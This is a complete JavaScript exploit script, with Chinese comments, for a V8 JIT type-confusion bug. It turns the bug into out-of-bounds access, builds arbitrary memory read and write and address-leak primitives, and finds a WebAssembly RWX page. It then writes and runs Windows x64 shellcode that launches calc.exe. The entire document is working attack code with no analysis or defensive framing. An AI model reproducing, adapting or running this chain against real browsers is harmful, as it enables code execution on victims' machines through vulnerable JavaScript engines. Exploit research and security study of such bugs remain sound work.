let vuln_array = [,,,,,,,,,,,, 6.1, 7.1, 8.1];	// 创建时的类型是HOLEY_DOUBLE_ELEMENTS
var oob_array;									// 用来将类型混淆转化为越界读写
var uint64_arw;									// 构造任意地址读写

// obj_leader的偏移
var obj_leader_offset;
// uint64_arw中三个关键值的相对偏移
var uint64_length_offset;	
var uint64_externalptr_offset;
var uint64_baseptr_offset;	
// 保存uint64_arw的三个关键值
var uint64_length;
var uint64_externalptr_ptr;
var uint64_baseptr_ptr;
// 指针压缩下的高32位地址
var compress_head_high32_addr;

// wasm
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module;
var wasm_instance;
var wasm_function;
var wasm_function_addr;
var wasm_shared_info;
var wasm_data;
var wasm_instance;
var wasm_rwx;

// 用来实现类型转换
var buf =new ArrayBuffer(16);
var uint32 = new Uint32Array(buf);
var float64 = new Float64Array(buf);
var big_uint64 = new BigUint64Array(buf);
// float-->uint
function f2i(f)
{
    float64[0] = f;
    return big_uint64[0];
}
// uint-->float
function i2f(i)
{
    big_uint64[0] = i;
    return float64[0];
}
// 64-->32
function f2half(val)
{
    float64[0]= val;
    let tmp = Array.from(uint32);
    return tmp;
}
// 32-->64
function half2f(val)
{
    uint32.set(val);
    return float64[0];
}
// 显示十六进制，纯粹为了美观
function hex(a) {
	return "0x" + a.toString(16);
}

function empty() {}
function f(p) {
	// 2.42902434121390450978968281326E-319 == 0xC00C
	vuln_array.push(typeof(Reflect.construct(empty, arguments, p)) === Proxy ? 0.2 : 2.42902434121390450978968281326E-319*2);
	for (let i=0; i<0xc00c; i++) {empty();} // 触发JIT
}
let p = new Proxy(Object, {
	get: () => {
		vuln_array[0] = {};					// 修改之后的类型是HOLEY_ELEMENTS
		oob_array = [1.1];					// 修改此数组的length来达到oob
		uint64_arw = new BigUint64Array(2);	// 实现任意地址读写
		obj_leaker = {
            a: 0xc00c/2,
            b: oob_array,
        };									// 实现地址泄露
		//%DebugPrint(oob_array);
		//%DebugPrint(uint64_arw);
		//%DebugPrint(obj_leaker);
		//%SystemBreak();
		return Object.prototype;
	}
});
function main(p) {
	for (let i=0; i<0xc00c; i++) {empty();}	// 触发JIT
	f(p);
}
// 将类型混淆转化为越界读写
function confusion_to_oob() {
	console.log("[+] convert confusion to oob......");
	vuln_array.pop();
	vuln_array.pop();
	vuln_array.pop();

	for (let i=0; i<0xc00c; i++) {empty();}	// 触发JIT

	main(empty);
	main(empty);

	main(p);
	console.log("	oob_array.length: " + hex(oob_array.length));
}
// 获取任意地址读写
function get_arw() {
	console.log("[+] get absolute read/write access......");
	
	// 相对于oob_array[0]的偏移
	uint64_length_offset = 16;
	uint64_externalptr_offset = 17;
	uint64_baseptr_offset = 18;
	// 用来保存这三个值
	uint64_length = f2i(oob_array[uint64_length_offset]);
	uint64_externalptr_ptr = f2i(oob_array[uint64_externalptr_offset]);
	uint64_baseptr_ptr = f2i(oob_array[uint64_baseptr_offset]);
	compress_head_high32_addr = uint64_externalptr_ptr & 0xffffffff00000000n;
	console.log("	uint64_length_offset: " + hex(uint64_length));
	console.log("	uint64_externalptr_offset: " + hex(uint64_externalptr_ptr));
	console.log("	uint64_baseptr_offset: " + hex(uint64_baseptr_ptr));
	console.log("	compress_head_high32_addr: " + hex(compress_head_high32_addr));
}

// 任意地址写
function arw_write(addr, sc)
{
    oob_array[uint64_length_offset] = i2f(BigInt(sc.length));
    oob_array[uint64_baseptr_offset] = i2f(0n);
	oob_array[uint64_externalptr_offset] = i2f(addr);
    for(let i = 0; i < sc.length; i+=1) {
		uint64_arw[i] = sc[i];
    }
}
// 针对于压缩指针的任意地址读
function compress_arw_read(addr)
{
	oob_array[uint64_baseptr_offset] = i2f(addr-0x1n);
	oob_array[uint64_externalptr_offset] = i2f(compress_head_high32_addr);
	let ret = uint64_arw[0];
	return ret;
}
// 地址泄露
obj_leader_offset = 0x16;
function addr_of(obj) {
	obj_leaker.b = obj;
	let half = f2half(oob_array[obj_leader_offset]);	// half[0]为低32位，half[1]为高32位
	// 标记在低32字节，对象在高32字节
	if (half[0] == 0xc00c) {
		return BigInt(half[1]);
	}
}
// 获取RWX内存地址
function get_wasm_rwx() {
	console.log("[+] run shellcode......");
	wasm_module = new WebAssembly.Module(wasm_code);
	wasm_instance = new WebAssembly.Instance(wasm_module, {});
	wasm_function = wasm_instance.exports.main;
	wasm_function_addr = addr_of(wasm_function);

	wasm_shared_info = compress_arw_read(BigInt(wasm_function_addr)+0xcn) & (0xffffffffn);
	wasm_data = compress_arw_read(BigInt(wasm_shared_info)+0x4n) &(0xffffffffn);
	wasm_instance = compress_arw_read(BigInt(wasm_data)+0x8n) &(0xffffffffn);
	wasm_rwx = compress_arw_read(BigInt(wasm_instance)+0x68n);
	console.log("	wasm_shared_info :" + hex(wasm_shared_info));
	console.log("	wasm_data : 0x" + hex(wasm_data));
	console.log("	wasm_instance : 0x" + hex(wasm_instance));
	console.log("	wasm_rwx : 0x" + hex(wasm_rwx));
}
// 将shellcode写入并执行
function run_shellcode() {
	var shellcode =  unescape("%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065");
	while(shellcode.length % 4 != 0){
		shellcode += "/u9090";
	}
	let sc = [];

	// 将shellcode转换为BigInt
	for (let i = 0; i < shellcode.length; i += 4) {
		sc.push(BigInt(shellcode.charCodeAt(i)) + BigInt(shellcode.charCodeAt(i + 1) * 0x10000) + BigInt(shellcode.charCodeAt(i + 2) * 0x100000000) + BigInt(shellcode.charCodeAt(i + 3) * 0x1000000000000));
	}
	arw_write(wasm_rwx, sc);

	console.log("[+] success!!!");
	wasm_function();
}

function exp() {
	confusion_to_oob();
	get_arw();
	get_wasm_rwx();
	run_shellcode();
}

exp();